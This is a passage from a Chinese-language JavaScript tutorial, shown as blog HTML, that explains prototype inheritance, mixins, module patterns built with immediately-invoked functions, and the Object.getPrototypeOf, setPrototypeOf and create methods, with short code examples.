language_">this</span>.<span class="title function_">base</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二步，子类继承父类的原型</span></span><br><span class="line"><span class="title class_">Rectangle</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Shape</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Rectangle</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Rectangle</span>;</span><br></pre></td></tr></table></figure>

<p>采用这样的写法以后，<code>instanceof</code>运算符会对子类和父类的构造函数，都返回<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rect = <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line"></span><br><span class="line">rect <span class="keyword">instanceof</span> <span class="title class_">Rectangle</span>  <span class="comment">// true</span></span><br><span class="line">rect <span class="keyword">instanceof</span> <span class="title class_">Shape</span>  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，子类是整体继承父类。有时只需要<strong>单个方法的继承</strong>，这时可以采用下面的写法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ClassB</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">print</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;<span class="comment">// 单个方法的继承</span></span><br><span class="line">  <span class="title class_">ClassA</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">print</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);<span class="comment">// 继承了ClassA的print方法</span></span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，子类<code>B</code>的<code>print</code>方法先调用父类<code>A</code>的<code>print</code>方法，再部署自己的代码。这就等于继承了父类<code>A</code>的<code>print</code>方法。</p>
<h3 id="4、多重继承"><a href="#4、多重继承" class="headerlink" title="4、多重继承"></a>4、多重继承</h3><p> JavaScript 不提供多重继承功能，即不允许一个对象同时继承多个对象。但是，可以通过变通方法，实现这个功能。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">M1</span>(<span class="params"></span>) &#123; <span class="comment">// 构造函数M1</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">hello</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">M2</span>(<span class="params"></span>) &#123; <span class="comment">// 构造函数M2</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">world</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">S</span>(<span class="params"></span>) &#123; <span class="comment">// 子类构造函数S</span></span><br><span class="line">  <span class="variable constant_">M1</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">  <span class="variable constant_">M2</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承 M1</span></span><br><span class="line">S.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="variable constant_">M1</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="comment">// 继承链上加入 M2</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(S.<span class="property"><span class="keyword">prototype</span></span>, <span class="variable constant_">M2</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定构造函数</span></span><br><span class="line">S.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = S;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="title function_">S</span>();</span><br><span class="line">s.<span class="property">hello</span> <span class="comment">// &#x27;hello&#x27;</span></span><br><span class="line">s.<span class="property">world</span> <span class="comment">// &#x27;world&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，子类<code>S</code>同时继承了父类<code>M1</code>和<code>M2</code>。这种模式又称为 Mixin（混入）。</p>
<h3 id="5、模块"><a href="#5、模块" class="headerlink" title="5、模块"></a>5、模块</h3><p>随着网站逐渐变成“互联网应用程序”，嵌入网页的 JavaScript 代码越来越庞大，越来越复杂。网页越来越像桌面程序，需要一个团队分工协作、进度管理、单元测试等等……开发者必须使用软件工程的方法，管理网页的业务逻辑。</p>
<p><strong>JavaScript 模块化编程</strong>，已经成为一个迫切的需求。理想情况下，开发者只需要实现核心的业务逻辑，其他都可以加载别人已经写好的模块。</p>
<p>但是，JavaScript 不是一种模块化编程语言，ES6 才开始支持“类”和“模块”。下面介绍传统的做法，如何利用对象实现模块的效果。</p>
<h4 id="（1）基本的实现方法"><a href="#（1）基本的实现方法" class="headerlink" title="（1）基本的实现方法"></a>（1）基本的实现方法</h4><p><strong>模块是实现特定功能的一组属性和方法的封装。</strong></p>
<p>简单的做法是把模块写成一个对象，所有的模块成员都放到这个对象里面。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = <span class="keyword">new</span> <span class="title class_">Object</span>(&#123;</span><br><span class="line">　_count : <span class="number">0</span>,</span><br><span class="line">　m1 : <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">　　<span class="comment">//...</span></span><br><span class="line">　&#125;,</span><br><span class="line">　m2 : <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">  　<span class="comment">//...</span></span><br><span class="line">　&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面的函数<code>m1</code>和<code>m2</code>，都封装在<code>module1</code>对象里。使用的时候，就是调用这个对象的属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用</span></span><br><span class="line">module1.<span class="title function_">m1</span>();</span><br></pre></td></tr></table></figure>

<p>但是，这样的写法会暴露所有模块成员，内部状态可以被外部改写。比如，外部代码可以直接改变内部计数器的值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module1.<span class="property">_count</span> = <span class="number">5</span>;</span><br></pre></td></tr></table></figure>



<h4 id="（2）封装私有变量："><a href="#（2）封装私有变量：" class="headerlink" title="（2）封装私有变量："></a>（2）封装私有变量：</h4><h5 id="（2-1）构造函数的写法"><a href="#（2-1）构造函数的写法" class="headerlink" title="（2-1）构造函数的写法"></a>（2-1）构造函数的写法</h5><p>我们可以利用构造函数，封装私有变量。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">StringBuilder</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> buffer = []; <span class="comment">// 模块的私有变量</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">add</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">     buffer.<span class="title function_">push</span>(str);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">toString</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> buffer.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>buffer</code>是模块的私有变量。一旦生成实例对象，外部是无法直接访问<code>buffer</code>的。但是，这种方法将私有变量封装在构造函数中，导致构造函数与实例对象是一体的，总是存在于内存之中，无法在使用完成后清除。这意味着，构造函数有双重作用，既用来塑造实例对象，又用来保存实例对象的数据，违背了构造函数与实例对象在数据上相分离的原则（即实例对象的数据，不应该保存在实例对象以外）。同时，非常耗费内存。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">StringBuilder</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">_buffer</span> = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">StringBuilder</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">  <span class="attr">constructor</span>: <span class="title class_">StringBuilder</span>,</span><br><span class="line">  <span class="attr">add</span>: <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_buffer</span>.<span class="title function_">push</span>(str);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">toString</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_buffer</span>.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这种方法将私有变量放入实例对象中，好处是看上去更自然，但是它的私有变量可以从外部读写，不是很安全。</p>
<h5 id="（2-2）立即执行函数的写法"><a href="#（2-2）立即执行函数的写法" class="headerlink" title="（2-2）立即执行函数的写法"></a>（2-2）立即执行函数的写法</h5><p>另一种做法是使用“立即执行函数”（Immediately-Invoked Function Expression，IIFE），将相关的属性和方法封装在一个函数作用域里面，可以达到不暴露私有成员的目的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">　<span class="keyword">var</span> _count = <span class="number">0</span>;</span><br><span class="line">　<span class="keyword">var</span> m1 = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">　  <span class="comment">//...</span></span><br><span class="line">　&#125;;</span><br><span class="line">　<span class="keyword">var</span> m2 = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">　　<span class="comment">//...</span></span><br><span class="line">　&#125;;</span><br><span class="line">　<span class="keyword">return</span> &#123;</span><br><span class="line">　　m1 : m1,</span><br><span class="line">　　m2 : m2</span><br><span class="line">　&#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>使用上面的写法，外部代码无法读取内部的<code>_count</code>变量。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">info</span>(module1.<span class="property">_count</span>); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>

<p>上面的<code>module1</code>就是 JavaScript 模块的基本写法。下面，再对这种写法进行加工。</p>
<h4 id="（3）模块的放大模式（向模块添加新方法）"><a href="#（3）模块的放大模式（向模块添加新方法）" class="headerlink" title="（3）模块的放大模式（向模块添加新方法）"></a>（3）模块的放大模式（向模块添加新方法）</h4><p>如果一个模块很大，必须分成几个部分，或者一个模块需要继承另一个模块，这时就有必要采用“放大模式”（augmentation）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="keyword">function</span> (<span class="params">mod</span>)&#123;</span><br><span class="line">　mod.<span class="property">m3</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">　　<span class="comment">//...</span></span><br><span class="line">　&#125;;</span><br><span class="line">　<span class="keyword">return</span> mod;</span><br><span class="line">&#125;)(module1);</span><br></pre></td></tr></table></figure>

<p>上面的代码为<code>module1</code>模块添加了一个新方法<code>m3()</code>，然后返回新的<code>module1</code>模块。</p>
<p>在浏览器环境中，模块的各个部分通常都是从网上获取的，有时无法知道哪个部分会先加载。如果采用上面的写法，第一个执行的部分有可能加载一个不存在空对象，这时就要采用”宽放大模式”（Loose augmentation）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="keyword">function</span> (<span class="params">mod</span>) &#123;</span><br><span class="line">　<span class="comment">//...</span></span><br><span class="line">　<span class="keyword">return</span> mod;</span><br><span class="line">&#125;)(<span class="variable language_">window</span>.<span class="property">module1</span> || &#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>与”放大模式”相比，“宽放大模式”就是“立即执行函数”的参数可以是空对象。</p>
<h4 id="（4）输入全局变量（保证独立性）"><a href="#（4）输入全局变量（保证独立性）" class="headerlink" title="（4）输入全局变量（保证独立性）"></a>（4）输入全局变量（保证独立性）</h4><p>独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。</p>
<p>为了在模块内部调用全局变量，必须显式地将其他变量输入模块。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="keyword">function</span> (<span class="params">$, YAHOO</span>) &#123;</span><br><span class="line">　<span class="comment">//...</span></span><br><span class="line">&#125;)(jQuery, <span class="variable constant_">YAHOO</span>); <span class="comment">// 向模块内部传入全局变量</span></span><br></pre></td></tr></table></figure>

<p>上面的<code>module1</code>模块需要使用 jQuery 库和 YUI 库，就把这两个库（其实是两个模块）当作参数输入<code>module1</code>。这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显。</p>
<p><strong>立即执行函数还可以起到命名空间的作用</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params">$, <span class="variable language_">window</span>, <span class="variable language_">document</span></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">go</span>(<span class="params">num</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">handleEvents</span>(<span class="params"></span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">initialize</span>(<span class="params"></span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">dieCarouselDie</span>(<span class="params"></span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//attach to the global scope</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">finalCarousel</span> = &#123; <span class="comment">// 对外暴露接口</span></span><br><span class="line">    init : initialize,</span><br><span class="line">    destroy : dieCarouselDie</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;)( jQuery, <span class="variable language_">window</span>, <span class="variable language_">document</span> );</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>finalCarousel</code>对象输出到全局，对外暴露<code>init</code>和<code>destroy</code>接口，<strong>内部方法<code>go</code>、<code>handleEvents</code>、<code>initialize</code>、<code>dieCarouselDie</code>都是外部无法调用的</strong>。</p>
<h2 id="四、Object-对象的相关方法"><a href="#四、Object-对象的相关方法" class="headerlink" title="四、Object 对象的相关方法"></a>四、Object 对象的相关方法</h2><p> JavaScript 在<code>Object</code>对象上面，提供了很多相关方法，处理面向对象编程的相关操作。本章介绍这些方法。 </p>
<h3 id="1、Object-getPrototypeOf-获取原型对象"><a href="#1、Object-getPrototypeOf-获取原型对象" class="headerlink" title="1、Object.getPrototypeOf() 获取原型对象"></a>1、Object.getPrototypeOf() 获取原型对象</h3><p><code>Object.getPrototypeOf</code>方法<strong>返回参数对象的原型</strong>。这是获取原型对象的标准方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> F = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(f) === F.<span class="property"><span class="keyword">prototype</span></span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，实例对象<code>f</code>的原型是<code>F.prototype</code>。</p>
<p>下面是几种特殊对象的原型。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 空对象的原型是 Object.prototype</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(&#123;&#125;) === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Object.prototype 的原型是 null</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) === <span class="literal">null</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数的原型是 Function.prototype</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(f) === <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h3 id="2、Object-setPrototypeOf-设置原型对象"><a href="#2、Object-setPrototypeOf-设置原型对象" class="headerlink" title="2、Object.setPrototypeOf() 设置原型对象"></a>2、Object.setPrototypeOf() 设置原型对象</h3><p> <code>Object.setPrototypeOf</code>方法为参数对象<strong>设置原型</strong>，<strong>返回该参数对象</strong>。它接受两个参数，第一个是现有对象，第二个是原型对象。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> b = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(a, b);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(a) === b <span class="comment">// true</span></span><br><span class="line">a.<span class="property">x</span> <span class="comment">// 1  a对象共享b对象的属性</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>Object.setPrototypeOf</code>方法将对象<code>a</code>的原型，设置为对象<code>b</code>，因此<code>a</code>可以共享<code>b</code>的属性。</p>
<h5 id="使用Object-setPrototypeOf方法模拟new命令"><a href="#使用Object-setPrototypeOf方法模拟new命令" class="headerlink" title="使用Object.setPrototypeOf方法模拟new命令"></a><strong>使用<code>Object.setPrototypeOf</code>方法模拟<code>new</code>命令</strong></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> F = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">foo</span> = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(&#123;&#125;, F.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// 模拟new命令</span></span><br><span class="line">F.<span class="title function_">call</span>(f);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>new</code>命令新建实例对象，其实可以分成两步。第一步，将一个空对象的原型设为构造函数的<code>prototype</code>属性（上例是<code>F.prototype</code>）；第二步，将构造函数内部的<code>this</code>绑定这个空对象，然后执行构造函数，使得定义在<code>this</code>上面的方法和属性（上例是<code>this.foo</code>），都转移到这个空对象上。 </p>
<h3 id="3、-Object-create-创建实例对象，指向目标对象的原型"><a href="#3、-Object-create-创建实例对象，指向目标对象的原型" class="headerlink" title="3、 Object.create() 创建实例对象，指向目标对象的原型"></a>3、 Object.create() 创建实例对象，指向目标对象的原型</h3><p>生成实例对象的常用方法是，使用<code>new</code>命令让构造函数返回一个实例。但是很多时候，只能拿到一个实例对象，它可能根本不是由构建函数生成的，那么能不能从一个实例对象，生成另一个实例对象呢？</p>
<p>JavaScript 提供了<code>Object.create</code>方法，用来满足这种需求。<strong>该方法接受一个对象作为参数，然后以它为原型，返回一个实例对象。</strong>该实例完全继承原型对象的属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原型对象</span></span><br><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  <span class="attr">print</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例对象</span></span><br><span class="line"><span class="keyword">var</span> B = <span class="title class_">Object</span>.<span class="title function_">create</span>(A); <span class="comment">// 以A为原型，创建了B实例对象，使B继承了A的属性</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(B) === A <span class="comment">// true</span></span><br><span class="line">B.<span class="title function_">print</span>() <span class="comment">// hello</span></span><br><span class="line">B.<span class="property">print</span> === A.<span class="property">print</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>Object.create</code>方法以<code>A</code>对象为原型，生成了<code>B</code>对象。<code>B</code>继承了<code>A</code>的所有属性和方法。</p>
<p>实际上，<code>Object.create</code>方法可以用下面的代码代替。</p>
<h5 id="内部实现原理"><a href="#内部实现原理" class="headerlink" title="内部实现原理"></a>内部实现原理</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="title class_">Object</span>.<span class="property">create</span> !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="property">create</span> = <span class="keyword">function</span> (<span class="params">obj</span>) &#123; <span class="comment">// 模拟Object.create方法</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">F</span>(<span class="params"></span>) &#123;&#125; <span class="comment">// 创建一个空构造函数F</span></span><br><span class="line">    F.<span class="property"><span class="keyword">prototype</span></span> = obj; <span class="comment">// 让F的原型 指向参数obj（obj为传入的原型对象）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">F</span>(); <span class="comment">// 返回一个F的实例</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码表明，<code>Object.create</code>方法的实质是新建一个空的构造函数<code>F</code>，然后让<code>F.prototype</code>属性指向参数对象<code>obj</code>，最后返回一个<code>F</code>的实例，从而实现让该实例继承<code>obj</code>的属性。</p>
<p>下面三种方式生成的新对象是等价的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = <span class="title class_">Object</span>.<span class="title function_">create</span>(&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="keyword">var</span> obj3 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br></pre></td></tr></table></figure>

<p>如果想要生成一个不继承任何属性（比如没有<code>toString</code>和<code>valueOf</code>方法）的对象，可以将<code>Object.create</code>的参数设为<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>); <span class="comment">// 不继承Object的toString和valueOf方法的一个对象</span></span><br><span class="line"></span><br><span class="line">obj.<span class="title function_">valueOf</span>()</span><br><span class="line"><span class="comment">// TypeError: Object [object Object] has no method &#x27;valueOf&#x27;</span></span><br></pre></td></tr></table></figure>

<p> 上面代码中，对象<code>obj</code>的原型是<code>null</code>，它就不具备一些定义在<code>Object.prototype</code>对象上面的属性，比如<code>valueOf</code>方法。 </p>
<p>使用<code>Object.create</code>方法的时候，必须提供对象原型，即<strong>参数不能为空，或者不是对象，否则会报错</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">create</span>()</span><br><span class="line"><span class="comment">// TypeError: Object prototype may only be an Object or null</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="number">123</span>)</span><br><span class="line"><span class="comment">// TypeError: Object prototype may only be an Object or null</span></span><br></pre></td></tr></table></figure>

<p><code>Object.create</code>方法生成的新对象，动态继承了原型。在原型上添加或修改任何方法，会立刻反映在新对象之上。</p>
